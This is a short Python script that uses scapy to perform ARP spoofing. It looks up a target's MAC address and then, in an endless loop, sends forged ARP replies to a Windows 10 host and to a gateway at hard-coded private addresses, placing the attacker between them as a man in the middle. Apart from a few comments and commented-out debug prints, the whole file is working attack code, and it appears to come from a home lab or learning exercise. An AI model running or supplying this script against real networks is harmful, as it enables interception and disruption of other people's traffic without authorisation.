import scapy.all as scapy
import time

# getting the MAC address of the target computer
def get_mac(ip):
    ARP_request = scapy.ARP()
    ARP_request.pdst = ip
    broadcast = scapy.Ether()
    broadcast.dst = 'ff:ff:ff:ff:ff:ff'
    ARP_broadcast = broadcast/ARP_request
    # print(ARP_broadcast.show())
    answer = scapy.srp(ARP_broadcast)[0]
    # print(answer.summary())
    # print('-------------------------------')
    # print(answer[0])
    # print('-------------------------------')
    # print(type(answer))
    # print(answer[0][0])
    # print('-------------------------------')
    # print(answer[0][1].hwsrc)
    return answer[0][1].hwsrc


def arp_spoof(target_ip, fake_ip):
    # creating an ARP response
    ARP_packet = scapy.ARP()
    scapy.ls(scapy.ARP())

    # getting the target's MAC address
    target_MAC = get_mac(target_ip)

    # op is set to 1 by default, which is a request, setting op to 2 to e it a response
    ARP_packet.op = 2
    ARP_packet.pdst = target_ip  # target IP (win10)
    ARP_packet.hwdst = target_MAC  # target MAC (win10)
    ARP_packet.psrc = fake_ip # gateway IP
    # print(ARP_packet.summary())
    # print(ARP_packet.show())
    scapy.send(ARP_packet)

# trick the router and the target
while True:
    arp_spoof('192.168.2.133', '192.168.2.2')
    arp_spoof('192.168.2.2', '192.168.2.133')
    time.sleep(1)

